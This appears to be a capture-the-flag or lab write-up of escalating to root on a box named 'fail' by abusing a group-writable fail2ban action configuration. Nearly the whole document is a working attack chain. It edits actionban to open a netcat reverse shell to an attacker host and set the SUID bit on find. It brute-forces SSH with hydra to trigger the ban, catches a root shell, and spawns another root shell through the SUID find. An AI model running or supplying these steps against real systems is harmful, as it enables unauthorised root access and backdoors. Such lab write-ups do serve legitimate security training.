# 4 privesc fail2ban

```
fox@fail:~$ id
uid=1000(fox) gid=1001(fox) groups=1001(fox),1000(fail2ban)

# Fail2Ban is an IPS framework that protects computer servers from brute-force attacks.

Using https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/

# log file location; cant read it
fox@fail:~$ ls -la /var/log/fail2ban.log
-rw-r----- 1 root adm 127311 Aug 23 22:31 /var/log/fail2ban.log

fox@fail:~$ ls -la /etc/fail2ban/
[truncated]
drwxrwxr-x  2 root fail2ban  4096 Dec  3  2020 action.d

# /etc/fail2ban/action.d is WRITABLE by fail2ban group
# fox is part of fail2ban group

fox@fail:/etc/fail2ban/action.d$ ls -la iptables-multiport.conf
-rw-rw-r-- 1 root fail2ban 1420 Jan 18  2018 iptables-multiport.conf
# is writable

# updating /etc/fail2bain/action.d/iptables-multiport.conf
actionban = /usr/bin/nc -e /bin/bash 192.168.49.122 9000
            chmod +s /usr/bin/find

# before 
fox@fail:~$ ls -la /usr/bin/find
-rwxr-xr-x 1 root root 315904 Feb 16  2019 /usr/bin/find
			
# now trying to brute force ssh user fox

$ hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://192.168.122.126 -t 4 -s 22

$ nc -lvnp 9000
listening on [any] 9000 ...
connect to [192.168.49.122] from (UNKNOWN) [192.168.122.126] 36734
whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root)
fail

# after 
fox@fail:~$ ls -la /usr/bin/find
-rwsr-sr-x 1 root root 315904 Feb 16  2019 /usr/bin/find

# can get shell using find also 
fox@fail:~$ find . -exec /bin/sh -p \; -quit
# whoami
root
```
